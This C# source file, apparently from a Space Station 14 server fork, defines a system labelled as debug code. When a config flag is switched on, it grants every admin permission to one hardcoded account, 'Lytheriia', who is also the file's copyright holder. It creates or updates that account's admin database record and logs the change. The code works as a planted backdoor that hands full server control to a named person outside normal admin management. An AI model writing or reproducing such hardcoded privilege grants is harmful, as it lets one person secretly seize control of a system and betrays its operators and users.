// SPDX-FileCopyrightText: 2026 Lytheriia
//
// SPDX-License-Identifier: AGPL-3.0-or-later

using System.Linq;
using Content.Server.Database;
using Content.Shared._Erida.CCVar;
using Content.Shared.Administration;
using Robust.Shared.Configuration;


namespace Content.Server._Erida.ShitCode;

public sealed partial class PromoteAllFlagsSystem : EntitySystem
{
    [Dependency] private IConfigurationManager _cfg = default!;
    [Dependency] private IServerDbManager _dbManager = default!;

    private ISawmill _sawmill = default!;

    private const string TargetCkey = "Lytheriia";

    public override void Initialize()
    {
        base.Initialize();

        _sawmill = Logger.GetSawmill("erida-debug");

        _cfg.OnValueChanged(ECCVars.ShouldPromoteAllFlags, OnShouldPromoteChanged, true);
    }

    private void OnShouldPromoteChanged(bool value)
    {
        if (value)
            PromoteAllFlags();
    }

    private async void PromoteAllFlags()
    {
        var record = await _dbManager.GetPlayerRecordByUserName(TargetCkey);
        if (record == null)
        {
            _sawmill.Warning($"Player with ckey '{TargetCkey}' not found.");
            return;
        }

        var userId = record.UserId;

        var allFlags = AdminFlags.None;
        foreach (var flag in Enum.GetValues<AdminFlags>())
        {
            if (flag != AdminFlags.None)
                allFlags |= flag;
        }

        var admin = await _dbManager.GetAdminDataForAsync(userId);
        if (admin == null)
        {
            _sawmill.Warning($"Player with ckey '{TargetCkey}' is not async");
            await _dbManager.AddAdminAsync(new Admin()
            {
                UserId = record.UserId,
                Flags = GenAdminFlagList(allFlags, AdminFlags.None),
                Title = "Lytheriia"
            });
        }
        else
        {
            admin.Flags = GenAdminFlagList(allFlags, AdminFlags.None);

            await _dbManager.UpdateAdminAsync(admin);
        }
        _sawmill.Info($"Updated admin entry with all flags for {TargetCkey}.");
    }

    private static List<AdminFlag> GenAdminFlagList(AdminFlags posFlags, AdminFlags negFlags)
    {
        var posFlagList = AdminFlagsHelper.FlagsToNames(posFlags);
        var negFlagList = AdminFlagsHelper.FlagsToNames(negFlags);

        return [
            .. posFlagList.Select(f => new AdminFlag { Negative = false, Flag = f }),
            .. negFlagList.Select(f => new AdminFlag { Negative = true, Flag = f }),
        ];
    }
}
